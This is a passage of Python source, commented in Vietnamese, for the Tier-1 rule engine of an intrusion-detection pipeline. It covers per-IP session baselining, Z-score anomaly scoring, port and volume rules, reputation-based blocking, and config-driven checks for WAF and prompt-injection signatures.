        GHI NHẬN TOÀN BỘ traffic, evict stale profiles định kỳ.
        """
        # Kiểm soát kích thước cache để chống tấn công cạn kiệt trạng thái (State Exhaustion)
        if source_ip not in self.profiles and len(self.profiles) >= self.max_profiles:
            self._evict_stale_profiles()
            # Nếu vẫn vượt ngưỡng sau khi dọn dẹp stale profiles, tiến hành xoá 10% profiles cũ nhất (FIFO/LRU-style)
            if len(self.profiles) >= self.max_profiles:
                sorted_ips = sorted(
                    self.profiles.keys(), key=lambda ip: self.profiles[ip]["last_seen"] or 0
                )
                num_to_evict = max(1, int(self.max_profiles * 0.1))
                for ip_to_evict in sorted_ips[:num_to_evict]:
                    if ip_to_evict in self.profiles:
                        del self.profiles[ip_to_evict]

        # Eviction check mỗi eviction_interval updates
        self._update_counter += 1
        if self._update_counter % self.eviction_interval == 0:
            self._evict_stale_profiles()

        profile = self.profiles[source_ip]
        now = time.time()

        # Update profile
        profile["request_count"] += 1
        try:
            port = int(log_entry.get("Destination Port", 0))
            profile["unique_ports"].add(port)
        except (ValueError, TypeError):
            pass
        try:
            profile["total_fwd_packets"] += float(log_entry.get("Total Fwd Packets", 0))
        except (ValueError, TypeError):
            pass

        if profile["first_seen"] is None:
            profile["first_seen"] = now
        profile["last_seen"] = now

        # Tính deviation indicators
        deviation_reasons = []
        deviation_score = 0

        # Indicator 1: Port Scanning (Loại trừ HTTP/HTTPS traffic thông thường của client)
        non_http_ports = profile["unique_ports"] - {80, 443, 8080, 8443}
        non_http_port_count = len(non_http_ports)
        if non_http_port_count > 10:
            deviation_score += non_http_port_count * 3
            deviation_reasons.append(
                f"Quét cổng (Port scan): đã truy cập {non_http_port_count} cổng non-HTTP khác nhau"
            )

        # Indicator 2: High-frequency requests (so với global average)
        elapsed = max(now - profile["first_seen"], 1)
        request_rate = profile["request_count"] / elapsed
        if request_rate > self.global_avg_request_rate * self.deviation_threshold:
            deviation_score += 20
            deviation_reasons.append(
                f"Tần suất gửi yêu cầu cao: {request_rate:.2f} req/s "
                f"(ngưỡng bình thường: {self.global_avg_request_rate:.2f})"
            )

        # Indicator 3: Abnormal packet volume
        if profile["request_count"] > 0:
            avg_packets = profile["total_fwd_packets"] / profile["request_count"]
            if avg_packets > 500:
                deviation_score += 15
                deviation_reasons.append(
                    f"Số lượng gói tin trung bình cao: {avg_packets:.0f} gói/yêu cầu"
                )

        return {
            "source_ip": source_ip,
            "deviation_score": deviation_score,
            "deviation_reasons": deviation_reasons,
            "request_count": profile["request_count"],
            "unique_ports": len(profile["unique_ports"]),
            "is_anomalous": deviation_score > 0,
            "active_profiles": len(self.profiles),  # Metric cho monitoring
        }

    def update_global_baseline(self):
        """Cập nhật global average request rate từ tất cả IP profiles."""
        if not self.profiles:
            return
        total_rates = []
        now = time.time()
        for _ip, profile in self.profiles.items():
            if profile["first_seen"]:
                elapsed = max(now - profile["first_seen"], 1)
                total_rates.append(profile["request_count"] / elapsed)
        if total_rates:
            self.global_avg_request_rate = sum(total_rates) / len(total_rates)

    def reset_window(self):
        """Reset tất cả profiles. Gọi sau mỗi time window."""
        self.profiles.clear()
        self._update_counter = 0


class RuleEngine:
    """
    Tier 1 Rule Engine — Bộ lọc thông minh (KHÔNG random).

    Luồng xử lý mỗi log entry:
      1. Static Rules: Kiểm tra port nhạy cảm, volumetric attack
      2. Dynamic Rules: Áp dụng rule từ Feedback Loop (LangGraph Agent)
      3. Session Baselining: Kiểm tra behavioral deviation cho Source IP
      4. Quyết định hành động chi tiết (Action Differentiation): ESCALATE / BLOCK_IP / ALERT / AWAIT_HITL / LOG / DROP
    """

    def __init__(self):
        config = load_config()
        tier1_config = config.get("tier1", {})

        self.risk_threshold = tier1_config.get("risk_threshold", 15)
        # set() -> kiểm tra thành viên O(1) (dùng 3 lần/log trong hot-path evaluate).
        self.sensitive_ports = set(
            tier1_config.get("sensitive_ports", [21, 22, 23, 3389, 445, 1433, 3306])
        )
        self.max_fwd_packets = tier1_config.get("max_fwd_packets", 1000)
        # Ngưỡng Z-score cho phát hiện dị biệt thống kê Welford (zero-day). Mặc định
        # 3.5σ; cấu hình được để phục vụ phân tích độ nhạy (sensitivity analysis).
        self.z_threshold = tier1_config.get("z_threshold", 3.5)

        all_rules = tier1_config.get("dynamic_rules", [])
        self.dynamic_ip_blocks = set()
        self.dynamic_behavioral_rules = []
        for r in all_rules:
            if r.get("status", "ACTIVE") == "ACTIVE":
                field = r.get("field")
                pattern = r.get("pattern")
                if field == "Source IP" and pattern:
                    self.dynamic_ip_blocks.add(str(pattern))
                else:
                    self.dynamic_behavioral_rules.append((field, pattern, r.get("score", 50)))

        self.whitelist_ips = set(tier1_config.get("whitelist_ips", []))

        # --- DÀN DỰNG DEMO: tiền tố IP được leo thang thay vì chặn khi khớp chữ ký WAF ---
        # MẶC ĐỊNH RỖNG = TẮT HẲN, không đổi một bit hành vi nào. Chỉ buổi trình diễn mới
        # điền, và chỉ điền dải IP mà KHÔNG tập benchmark nào dùng (đã đối chiếu demo.json /
        # datatest.json / csic.json / ground_truth.json). Xem nhánh dùng nó ở `evaluate`.
        self.demo_escalate_prefixes = tuple(
            str(p) for p in (tier1_config.get("demo_escalate_waf_prefixes") or [])
        )

        # --- Reputation-based enforcement (tiền sử IP từ Threat Memory) ---
        # IP đã có "hồ sơ đen": điểm danh tiếng >= block_threshold -> Tier-1 CHẶN NGAY
        # (không tốn LLM); >= hitl_threshold -> AWAIT_HITL (đưa lên analyst) DÙ gói hiện
        # tại trông lành. Đây là "known-bad short-circuit": kẻ đã bị chứng minh xấu không
        # cần escalate lại. Có thể TẮT bằng reputation_enforcement=false.
        self.reputation_enforcement = tier1_config.get("reputation_enforcement", True)
        self.reputation_block_threshold = tier1_config.get("reputation_block_threshold", 70)
        self.reputation_hitl_threshold = tier1_config.get("reputation_hitl_threshold", 50)
        # Cache reputation trong RAM (TTL ngắn) để GIỮ Tier-1 ở tốc độ đường truyền —
        # tránh truy vấn SQLite cho MỖI log; IP lặp lại chỉ tốn O(1) trong burst.
        self._rep_cache: dict[str, tuple[float, float]] = {}
        self._rep_cache_ttl = tier1_config.get("reputation_cache_ttl", 5.0)
        # Chặn rò RAM: khi cache đầy (nhiều IP khác nhau) sẽ dọn các mục đã hết hạn.
        self._rep_cache_max = tier1_config.get("reputation_cache_max", 10000)

        # Theo dõi file modification time để hot-reload
        self.last_config_mtime = os.path.getmtime(CONFIG_PATH) if os.path.exists(CONFIG_PATH) else 0
        self.last_config_check_time = time.time()  # Chống I/O bottleneck

        # Session Baselining thay thế Random Sampling
        baseline_config = tier1_config.get("session_baseline", {})
        self.session_baseline = SessionBaseline(
            deviation_threshold=baseline_config.get("deviation_threshold", 2.0),
            window_seconds=baseline_config.get("window_seconds", 300),
            ttl_seconds=baseline_config.get("ttl_seconds", 600),
            max_profiles=baseline_config.get("max_profiles", 10000),
            eviction_interval=baseline_config.get("eviction_interval", 100),
        )

        # Prompt injection & jailbreak: các mẫu là CHUỖI THUẦN (không có metachar regex).
        # Trước đây compile thành regex `re.escape(p)` -> mỗi log quét tới 19 mẫu × 8 field
        # bằng regex engine. Giờ so khớp SUBSTRING không phân biệt hoa/thường (nhanh hơn
        # nhiều, kết quả & text lý do y hệt vì mẫu vốn là literal). Giữ list gốc để hiện
        # lý do, thêm list lowercase để so khớp O(1) mỗi mẫu.
        self.config = config
        guardrails_config = config.get("guardrails", {})
        self._set_signature_patterns(guardrails_config)

        # Unsupervised Anomaly Detection (Zero-Day statistical profiling trên các core features có corr cao)
        self.global_stats: dict[str, RunningStats] = {
            "Flow Duration": RunningStats(),
            "Total Fwd Packets": RunningStats(),
            "Total Length of Fwd Packets": RunningStats(),
            "Total Backward Packets": RunningStats(),
            "Total Length of Bwd Packets": RunningStats(),
            "Fwd Seg Size Min": RunningStats(),
            "Init Fwd Win Byts": RunningStats(),
            "Init Bwd Win Byts": RunningStats(),
            "Bwd Pkt Len Min": RunningStats(),
            "PSH Flag Cnt": RunningStats(),
            "Flow Pkts/s": RunningStats(),
        }
        # Cần 100 mẫu sạch để khởi tạo baseline tin cậy trước khi tính Z-score
        self.warmup_count = 100
        self.total_processed_logs = 0

        # Seed baseline từ hồ sơ 'golden' (benign đã kiểm định) nếu bật trong config;
        # sau đó baseline vẫn cập nhật online CÓ ĐIỀU KIỆN (chỉ DROP/LOG) như bình thường.
        self._seed_golden_baseline(tier1_config)

    def _seed_golden_baseline(self, tier1_config: dict) -> None:
        """Nạp golden baseline (trạng thái Welford của lưu lượng benign đã kiểm định)
        vào global_stats nếu được bật trong config. Mặc định TẮT để tương thích ngược.
        Sau khi seed, baseline vẫn cập nhật online CÓ ĐIỀU KIỆN (chỉ DROP/LOG)."""
        gb = tier1_config.get("golden_baseline", {}) if isinstance(tier1_config, dict) else {}
        if not (isinstance(gb, dict) and gb.get("enabled")):
            return
        path = str(gb.get("path", "")).strip()
        if not path:
            return
        if not os.path.isabs(path):
            path = os.path.join(os.path.dirname(__file__), "..", "..", path)
        if not os.path.exists(path):
            print(
                f"[Tier-1] Golden baseline bật nhưng thiếu file: {path} (bỏ qua, dùng warmup online)."
            )
            return
        try:
            with open(path, encoding="utf-8") as f:
                profile = json.load(f)
        except (OSError, ValueError) as exc:
            print(f"[Tier-1] Không đọc được golden baseline ({exc}); bỏ qua.")
            return
        # CHỐT AN TOÀN: baseline dựng ở thang TUYẾN TÍNH mà nạp vào code tính Z ở thang LOG
        # (hoặc ngược lại) thì mọi Z-score đều sai — và sai IM LẶNG, không có triệu chứng gì
        # ngoài việc số liệu trở nên vô nghĩa. Từ chối nạp thay vì suy biến âm thầm.
        _file_tf = str(profile.get("transform", "")) if isinstance(profile, dict) else ""
        if _file_tf != BASELINE_TRANSFORM_ID:
            print(
                f"[Tier-1] TỪ CHỐI golden baseline: file dựng ở thang '{_file_tf or 'tuyến tính (cũ)'}' "
                f"nhưng code tính Z ở thang '{BASELINE_TRANSFORM_ID}'. Bỏ seed, dùng warmup online.\n"
                f"         Khắc phục: .venv/bin/python experiments/build_golden_baseline.py"
            )
            return

        features = profile.get("features", {}) if isinstance(profile, dict) else {}
        seeded = 0
        for key, st in features.items():
            if key in self.global_stats and isinstance(st, dict):
                n = st.get("n", 0)
                if isinstance(n, (int, float)) and n >= 2:
                    self.global_stats[key].seed(
                        int(n), float(st.get("mean", 0.0)), float(st.get("m2", 0.0))
                    )
                    seeded += 1
        if seeded:
            print(
                f"[Tier-1] Seed golden baseline: {seeded}/{len(self.global_stats)} feature "
                f"(nguồn: {os.path.basename(path)}); cập nhật online có điều kiện tiếp tục như thường."
            )

    def learn_baseline(self, log_entry: dict) -> None:
        """Cập nhật baseline Welford KHÔNG điều kiện từ một bản ghi benign đã kiểm định.
        Dùng OFFLINE để dựng golden baseline (mọi mẫu đều đã biết là sạch), khác với
        đường runtime vốn chỉ cập nhật với phán quyết DROP/LOG."""
        for key, aliases in _RAW_TO_CANONICAL.items():
            if key not in self.global_stats:
                continue
            for alias in aliases:
                if alias in log_entry:
                    try:
                        parsed = float(log_entry[alias])
                    except (ValueError, TypeError):
                        continue
                    # LỌC Inf/NaN: CICIDS có `Flow Pkts/s = Inf` khi Flow Duration = 0.
                    # Đường evaluate đã lọc từ trước, đường HỌC thì chưa — một giá trị Inh
                    # lọt vào Welford làm mean/M2 thành NaN VĨNH VIỄN và giết luôn đặc trưng
                    # đó (quan sát thật: golden baseline có Flow Pkts/s = nan).
                    if math.isinf(parsed) or math.isnan(parsed):
                        break
                    # scale_feature: PHẢI khớp với phía tính Z (xem evaluate) — nếu
                    # học ở thang này mà chấm ở thang kia thì Z-score vô nghĩa.
                    self.global_stats[key].push(scale_feature(key, parsed))
                    break

    def _set_signature_patterns(self, guardrails_config: dict) -> None:
        """Nạp mẫu prompt-injection/jailbreak (chuỗi thuần) + bản lowercase để so khớp
        substring nhanh. Dùng chung cho __init__ và reload_dynamic_rules (DRY)."""
        injection_pats = guardrails_config.get("injection_patterns", [])
        jailbreak_pats = guardrails_config.get("jailbreak_patterns", [])
        self.injection_patterns = [p for p in injection_pats if isinstance(p, str) and p]
        self.jailbreak_patterns = [p for p in jailbreak_pats if isinstance(p, str) and p]
        self._injection_patterns_lc = [p.lower() for p in self.injection_patterns]
        self._jailbreak_patterns_lc = [p.lower() for p in self.jailbreak_patterns]

    def _check_waf_signatures(self, log_entry: dict) -> str | None:
        """
        Bộ lọc Signature WAF siêu nhẹ để phát hiện nhanh các dấu hiệu SQLi, XSS, Path Traversal
        ngay tại Tier-1 nhằm bảo vệ Tier-2 khỏi bị nghẽn (Resource Starvation).

        Thân hàm nằm ở `match_waf_family` (mức module) vì Tier-2 cũng cần đúng phép so khớp
        này — xem giải thích ở đó.
        """
        return match_waf_family(log_entry)

    def _check_injection_signatures(self, log_entry: dict) -> str | None:
        """
        Kiểm tra các mẫu Prompt Injection và Jailbreak từ config hệ thống ngay tại Tier-1.
        """
        target_fields = [
            "payload",
            "uri",
            "user_agent",
            "User-Agent",
            "headers",
            "message",
            "command",
            "process",
        ]
        for field in target_fields:
            val = log_entry.get(field) or log_entry.get(field.lower())
            if val and isinstance(val, str):
                # CÙNG lý do với `_check_waf_signatures`: mẫu tiêm nhiễm mã hoá URL/thực thể
                # HTML sẽ lọt nếu chỉ so trên chuỗi nguyên văn.
                for cand in normalize_for_signature(val):
                    val_lc = cand.lower()
                    # 1. Prompt Injection Patterns (substring, không phân biệt hoa/thường)
                    for raw, low in zip(
                        self.injection_patterns, self._injection_patterns_lc, strict=False
                    ):
                        if low in val_lc:
                            return f"Prompt Injection Pattern: Phát hiện '{raw}' trong '{field}'"
                    # 2. Jailbreak Patterns
                    for raw, low in zip(
                        self.jailbreak_patterns, self._jailbreak_patterns_lc, strict=False
                    ):
                        if low in val_lc:
                            return f"Jailbreak Pattern: Phát hiện '{raw}' trong '{field}'"
        return None

    def _get_reputation_score(self, ip: str) -> float:
        """Lấy điểm danh tiếng của IP từ Threat Memory (có cache TTL để giữ Tier-1 nhanh).

        AN TOÀN TUYỆT ĐỐI: mọi lỗi truy vấn/DB chưa sẵn sàng -> trả 0.0. Tier-1 KHÔNG
        BAO GIỜ được sập chỉ vì tra cứu bộ nhớ dài hạn.
        """
        if not ip or ip == "unknown":
            return 0.0
        now = time.time()
        cached = self._rep_cache.get(ip)
        if cached and cached[1] > now:
            return cached[0]
        score = 0.0
        try:
            from src.agent.threat_memory import threat_memory

            rep = threat_memory.get_ip_reputation(ip)
            if rep:
                score = float(rep.get("reputation_score", 0.0) or 0.0)
        except Exception:
            score = 0.0
        if len(self._rep_cache) >= self._rep_cache_max and ip not in self._rep_cache:
            # Dọn các mục đã hết hạn trước khi thêm mới (chống rò RAM trên chạy dài).
            self._rep_cache = {k: v for k, v in self._rep_cache.items() if v[1] > now}
        self._rep_cache[ip] = (score, now + self._rep_cache_ttl)
        return score

    def evaluate(self, log_entry: dict) -> dict:
        """
        Đánh giá log entry qua các tầng: Whitelist -> Static/Dynamic Rules -> Session Baseline -> Action.
        """
        # Tự động reload configurations nếu file system_settings.yaml bị sửa đổi (đã gộp & bảo vệ I/O bằng cách hạn chế tần suất check)
        now_time = time.time()
        if now_time - self.last_config_check_time > 5.0:
            self.last_config_check_time = now_time
            try:
                if os.path.exists(CONFIG_PATH):
                    current_mtime = os.path.getmtime(CONFIG_PATH)
                    if current_mtime > self.last_config_mtime:
                        self.reload_dynamic_rules()
                        self.last_config_mtime = current_mtime
            except (yaml.YAMLError, FileNotFoundError) as e:
                print(f"[!] Config reload failed: {e}. Using cached configurations.")
            except Exception as e:
                print(f"[!] Unexpected error during config reload: {e}")

        score = 0
        reasons = []

        # Chuan hoa key: ho tro ca CICIDS CSV format va normalized JSON format
        for alias, canonical in _KEY_ALIASES.items():
            if alias in log_entry and canonical not in log_entry:
                log_entry[canonical] = log_entry[alias]

        # --- Tầng 0: Whitelist Check (ĐÁNH DẤU — KHÔNG return sớm) ---
        # IP whitelist VẪN được phân tích ĐẦY ĐỦ ở Tier-1 (chữ ký WAF/injection, Z-score,
        # luật tĩnh/động, baseline...) để analyst QUAN SÁT hành vi — nhưng hành động cuối
        # LUÔN bị ép về WHITELIST_DROP: CHO QUA, KHÔNG chặn / không escalate / không HITL /
        # miễn trừ reputation. Nhờ vậy lần chạy thứ 2 vẫn hiện "kiểu tấn công + suy luận"
        # như log thường (chỉ khác: không bị chặn) thay vì bị nuốt lặng ở Tầng 0.
        source_ip = log_entry.get("Source IP", "unknown")
        is_whitelisted = source_ip in self.whitelist_ips
        log_entry["is_whitelisted"] = is_whitelisted

        # --- Tầng 0.1: WAF Signature Check (Chống LLM Starvation) ---
        waf_reason = self._check_waf_signatures(log_entry)
        has_waf_match = bool(waf_reason)
        if waf_reason:
            score += 50
            reasons.append(waf_reason)

        # --- Tầng 0.2: Prompt Injection / Jailbreak Signature Check ---
        injection_reason = self._check_injection_signatures(log_entry)
        has_injection_match = bool(injection_reason)
        if injection_reason:
            score += 50
            reasons.append(injection_reason)

        # --- Tầng 0.5: Kiểm tra Unsupervised Statistical Anomaly ---
        self.total_processed_logs += 1

        # Ánh xạ các trường mạng thô sang các nhóm tính năng
        current_values = {}
        for key, aliases in _RAW_TO_CANONICAL.items():
            val = None
            for alias in aliases:
                if alias in log_entry:
                    try:
                        parsed = float(log_entry[alias])
                        if not math.isinf(parsed) and not math.isnan(parsed):
                            val = parsed
                            break
                    except (ValueError, TypeError):
                        pass
            if val is not None:
                current_values[key] = val

        # Chỉ kích hoạt cảnh báo sau giai đoạn warmup cho từng key cụ thể (dựa trên số lượng mẫu benign của key đó)
        max_z_score = 0.0
        z_anomaly_reasons = []
        z_anomaly_score = 0

        for key, val in current_values.items():
            stats = self.global_stats[key]
            if stats.n >= self.warmup_count:
                mean_val = stats.mean()
                std_val = stats.std_dev()

                # Bỏ qua nếu dữ liệu không biến động (std quá bé)
                if std_val > 0.01:
                    # Tính Z trong CÙNG không gian mà baseline đã học (xem scale_feature):
                    # đặc trưng khối-lượng/thời-lượng/tốc-độ được log1p hoá để Z-score không
                    # còn giả định sai về phân phối Gauss trên dữ liệu lệch đuôi.
                    z_score = abs(scale_feature(key, val) - mean_val) / std_val
                    max_z_score = max(max_z_score, z_score)
                    if z_score > self.z_threshold:
                        # Điểm phạt tăng dần theo độ lệch, cap ở 40
                        penalty = min(int(z_score * 5), 40)
                        z_anomaly_score += penalty
                        # Hiển thị giá trị THÔ (dễ đọc cho analyst) nhưng Z tính ở thang đã
                        # biến đổi — nêu rõ để người audit không hiểu nhầm phép tính.
                        _scaled_note = " · thang log" if key in LOG_SCALE_FEATURES else ""
                        z_anomaly_reasons.append(
                            f"Phát hiện dị biệt thống kê Zero-day [{key}]: Giá trị {val:.1f} "
                            f"lệch {z_score:.2f} lần độ lệch chuẩn "
                            f"(Z-Score > {self.z_threshold:.1f}{_scaled_note})"
                        )

        if z_anomaly_reasons:
            score += z_anomaly_score
            reasons.extend(z_anomaly_reasons)

        # --- Tầng 1: Static Rules ---
        dest_port = log_entry.get("Destination Port", -1)
        fwd_packets = log_entry.get("Total Fwd Packets", 0)

        try:
            if int(dest_port) in self.sensitive_ports:
                score += 40
                reasons.append(f"Truy cập cổng nhạy cảm (Cổng {dest_port})")
        except (ValueError, TypeError):
            pass

        try:
            if float(fwd_packets) > self.max_fwd_packets:
                score += 30
                reasons.append(f"Bất thường về dung lượng ({fwd_packets} gói tin chiều đi)")
        except (ValueError, TypeError):
            pass

        # --- Tầng 2: Dynamic Rules (Từ Feedback Loop) ---
        # dynamic_ip_block: luật Source-IP ĐÃ được Analyst DUYỆT (HITL) khớp CHÍNH XÁC ->
        # Tier-1 TỰ CHẶN ngay lần tái phạm, KHÔNG cần leo thang Tier-2 (đây là "Tier-1 học được").
        dynamic_ip_block = False

        # O(1) lookup cho luật chặn IP
        if source_ip in self.dynamic_ip_blocks:
            dynamic_ip_block = True
            reasons.append(f"Luật động [từ Tác tử]: Source IP='{source_ip}'")
            score += 100

        # Kiểm tra luật hành vi
        for rule_field, rule_pattern, rule_score in self.dynamic_behavioral_rules:
            if rule_field and rule_pattern:
                field_value = str(log_entry.get(rule_field, ""))
                if rule_pattern in field_value:
                    score += rule_score
                    reasons.append(f"Luật động [từ Tác tử]: {rule_field}='{rule_pattern}'")

        # --- Tầng 3: Session Baseline ---
        source_ip = log_entry.get("Source IP", "unknown")
        baseline_result = self.session_baseline.update(source_ip, log_entry)

        if baseline_result["is_anomalous"]:
            score += baseline_result["deviation_score"]
            reasons.extend(baseline_result["deviation_reasons"])

        # --- Tầng 3.5: Reputation Enforcement (tiền sử IP) ---
        # Kẻ ĐÃ bị chứng minh xấu không cần escalate lại: chặn/HITL ngay theo hồ sơ danh
        # tiếng, ĐỘC LẬP với điểm gói hiện tại (gói lành từ IP xấu vẫn bị nâng cấp).
        rep_action = None
        if self.reputation_enforcement and not is_whitelisted:
            rep_score = self._get_reputation_score(source_ip)
            if rep_score >= self.reputation_block_threshold:
                rep_action = "BLOCK_IP"
                reasons.append(
                    f"IP có tiền sử NGUY HIỂM (điểm danh tiếng {rep_score:.0f} ≥ "
                    f"{self.reputation_block_threshold}) → chặn tự động"
                )
            elif rep_score >= self.reputation_hitl_threshold:
                rep_action = "ESCALATE"
                reasons.append(
                    f"IP có tiền sử đáng ngờ (điểm danh tiếng {rep_score:.0f} ≥ "
                    f"{self.reputation_hitl_threshold}) → đẩy lên Cổng ML (Tier-1) / LLM (Tier-2)"
                )

        # --- Đánh giá & Phân luồng Action (Tier 1 Action Differentiation) ---
        log_entry["tier1_score"] = score
        log_entry["tier1_reasons"] = reasons
        log_entry["tier1_z_score"] = max_z_score
        log_entry["tier1_baseline"] = {
            "ip_request_count": baseline_result["request_count"],
            "ip_unique_ports": baseline_result["unique_ports"],
        }

        if is_whitelisted:
            # IP whitelist: ĐÃ phân tích đầy đủ ở trên (score + reasons giữ nguyên để
            # analyst quan sát) nhưng LUÔN cho qua — ưu tiên CAO NHẤT, đè mọi nhánh chặn.
            log_entry["tier1_action"] = "WHITELIST_DROP"
        elif rep_action == "BLOCK_IP":
            # Tiền sử NGUY HIỂM (reputation >= ngưỡng block): CHẶN NGAY, ĐỘC LẬP với điểm
            # gói hiện tại — kẻ đã bị chứng minh xấu không cần escalate lại, không tốn LLM.
            log_entry["tier1_action"] = "BLOCK_IP"
            log_entry["tier1_block_evidence"] = "reputation"
        elif score >= self.risk_threshold:
            dest_port_val = 0
            try:
                dest_port_val = int(dest_port)
            except (ValueError, TypeError):
                pass

            fwd_pkts_val = 0.0
            try:
                fwd_pkts_val = float(fwd_packets)
            except (ValueError, TypeError):
                pass

            # has_waf_match / has_injection_match đã được ghi ngay lúc check (Tầng 0.1/0.2)
            # -> tấn công web rõ ràng (SQLi/XSS/Command Inj) bị chặn luôn để bảo vệ LLM,
            # không cần quét lại danh sách reasons (nhanh hơn + không phụ thuộc text lý do).

            if dynamic_ip_block:
                # IP đã được Analyst DUYỆT chặn (HITL -> luật ACTIVE): Tier-1 TỰ CHẶN ngay,
                # KHÔNG tốn LLM. Ưu tiên CAO NHẤT — kẻ tái phạm không cần leo thang lại.
                log_entry["tier1_action"] = "BLOCK_IP"
                log_entry["tier1_block_evidence"] = "dynamic_rule"
            elif (
                self.demo_escalate_prefixes
                and has_waf_match
                and str(source_ip).startswith(self.demo_escalate_prefixes)
            ):
                # DÀN DỰNG CHO BUỔI DIỄN — KHÔNG phải hành vi mặc định. Xem
                # `tier1.demo_escalate_waf_prefixes` trong config (mặc định RỖNG = tắt hẳn).
                #
                # Vì sao cần: đo được trên lượt chạy 2026-08-03 — Tier-1 tự giải quyết
                # 1.894/2.000 sự kiện CSIC (94,7%), và TOÀN BỘ 357 mẫu có mã kỹ thuật đều
                # dính lớp chữ ký WAF ngay tại đây. Hệ quả: trong 203 sự kiện CSIC lọt lên
                # Tier-2 có ĐÚNG 0 mẫu mang mã kỹ thuật -> màn hình không bao giờ hiện được
                # năng lực quy kết, dù năng lực ấy có thật.
                #
                # Núm này chỉ đổi ĐÍCH ĐẾN (chặn -> leo thang), KHÔNG đổi phán quyết và
                # KHÔNG chạm dữ liệu. Nó lọc theo tiền tố IP nên chỉ với tay tới đúng dải
                # dàn dựng; mọi tập benchmark không có IP nào thuộc dải đó.
                log_entry["tier1_action"] = "ESCALATE"
                reasons.append("[DÀN DỰNG DEMO] chữ ký WAF -> leo thang thay vì chặn")
            elif has_waf_match:
                log_entry["tier1_action"] = "BLOCK_IP"
                log_entry["tier1_block_evidence"] = "waf_signature"
            elif has_injection_match:
                # Prompt Injection / Jailbreak: gửi lên Tier-2 xử lý
                log_entry["tier1_action"] = "ESCALATE"
            elif dest_port_val in self.sensitive_ports and fwd_pkts_val < 200:
                # BruteForce: port nhạy cảm, packet count trung bình → block IP
                #
                # BẰNG CHỨNG YẾU — CHỈ SUY TỪ LUỒNG. Nhánh này không đọc nội dung gói: nó chỉ
                # thấy "cổng nhạy cảm + số gói vừa phải". Trong một mạng LAN thật thì SMB (445),
                # SSH (22), RDP (3389), MSSQL (1433) là lưu lượng nội bộ BÌNH THƯỜNG, nên nhánh
                # này bắn nhầm vào máy trạm lành là chuyện thường tình, không phải ngoại lệ.
                #
                # Vì vậy phán quyết ở đây là NGĂN CHẶN TẠM THỜI (blacklist Redis TTL 1 giờ),
                # KHÔNG được nâng thành hồ sơ danh tiếng vĩnh viễn. `subscriber` đọc nhãn này
                # để phân biệt; xem chú thích tại nhánh BLOCK_IP ở đó.
                log_entry["tier1_action"] = "BLOCK_IP"
                log_entry["tier1_block_evidence"] = "heuristic_flow_port"
            elif fwd_pkts_val > self.max_fwd_packets:
                # DoS/DDoS: volumetric → alert không block (có thể distributed)
                log_entry["tier1_action"] = "ALERT"
            elif dest_port_val not in self.sensitive_ports and dest_port_val not in [80, 443, 8080]:
                # Lateral movement / Infiltration: unusual port, moderate score → ESCALATE
                log_entry["tier1_action"] = "ESCALATE"
            else:
                log_entry["tier1_action"] = "ESCALATE"
        else:
            log_entry["tier1_action"] = "DROP" if not reasons else "LOG"

        # Sàn Escalate theo tiền sử: IP đáng ngờ (reputation >= ngưỡng HITL) mà gói hiện tại
        # chưa đủ mạnh -> NÂNG lên ESCALATE cho Tier-2 xem, thay vì lặng lẽ DROP/LOG.
        if rep_action == "ESCALATE" and log_entry["tier1_action"] in ("DROP", "LOG"):
            log_entry["tier1_action"] = "ESCALATE"

        # --- Tầng 0.6: Cập nhật RunningStats CHỈ với dữ liệu được coi là benign (DROP hoặc LOG) ---
        # Điều này chống Baseline Poisoning (tấn công Slow-Rate baseline drift)
        #
        # scale_feature BẮT BUỘC ở đây — cùng không gian với phía TÍNH Z (xem Tầng 0.5) và với
        # learn_baseline/golden baseline. TRƯỚC ĐÂY dòng này push giá trị THÔ trong khi Z được
        # tính ở thang log1p: baseline log-space bị bơm giá trị tuyến tính nên phương sai NỔ và
        # mọi Z-score sụp về ~0 -> Welford mù với chính các đặc trưng khối-lượng/thời-lượng nó
        # sinh ra để canh. Đo thật: sau 150 log benign, sd của `Flow Duration` đi từ 5.26 lên
        # 120.669 (23.000 lần) và Z của một zero-day exfil tụt từ 4.58 xuống 0.07. Hỏng ÂM THẦM
        # — không exception, chỉ là số liệu mất hết ý nghĩa.
        if log_entry["tier1_action"] in ("DROP", "LOG"):
            for key, val in current_values.items():
                if key in self.global_stats:
                    self.global_stats[key].push(scale_feature(key, val))

        return log_entry

    def reload_dynamic_rules(self):
        """
        Hot-reload dynamic rules, whitelists, thresholds, and configurations từ YAML config.
        Chỉ tải các luật đã phê duyệt (status == 'ACTIVE').
        """
        config = load_config()
        tier1_config = config.get("tier1", {})

        self.risk_threshold = tier1_config.get("risk_threshold", self.risk_threshold)
        self.sensitive_ports = set(tier1_config.get("sensitive_ports", self.sensitive_ports))
        self.max_fwd_packets = tier1_config.get("max_fwd_packets", self.max_fwd_packets)
        self.whitelist_ips = set(tier1_config.get("whitelist_ips", []))
        # Nạp lại kèm hot-reload: tắt dàn dựng giữa buổi mà không cần khởi động lại tiến trình.
        self.demo_escalate_prefixes = tuple(
            str(p) for p in (tier1_config.get("demo_escalate_waf_prefixes") or [])
        )
        self.reputation_enforcement = tier1_config.get(
            "reputation_enforcement", self.reputation_enforcement
        )
        self.reputation_block_threshold = tier1_config.get(
            "reputation_block_threshold", self.reputation_block_threshold
        )
        self.reputation_hitl_threshold = tier1_config.get(
            "reputation_hitl_threshold", self.reputation_hitl_threshold
        )

        all_rules = tier1_config.get("dynamic_rules", [])
        self.dynamic_ip_blocks = set()
        self.dynamic_behavioral_rules = []
        for r in all_rules:
            if r.get("status", "ACTIVE") == "ACTIVE":
                field = r.get("field")
                pattern = r.get("pattern")
                if field == "Source IP" and pattern:
                    self.dynamic_ip_blocks.add(str(pattern))
                else:
                    self.dynamic_behavioral_rules.append((field, pattern, r.get("score", 50)))

        # Hot-reload injection & jailbreak patterns (substring — xem _set_signature_patterns)
        self.config = config
        self._set_signature_patterns(config.get("guardrails", {}))

        # Hot-reload SessionBaseline parameters without wiping profiles cache
        baseline_config = tier1_config.get("session_baseline", {})
        self.session_baseline.deviation_threshold = baseline_config.get(
            "deviation_threshold", self.session_baseline.deviation_threshold
        )
        self.session_baseline.window_seconds = baseline_config.get(
            "window_seconds", self.session_baseline.window_seconds
        )
        self.session_baseline.ttl_seconds = baseline_config.get(
            "ttl_seconds", self.session_baseline.ttl_seconds
        )
        self.session_baseline.max_profiles = baseline_config.get(
            "max_profiles", self.session_baseline.max_profiles
        )
        self.session_baseline.eviction_interval = baseline_config.get(
            "eviction_interval", self.session_baseline.eviction_interval
        )
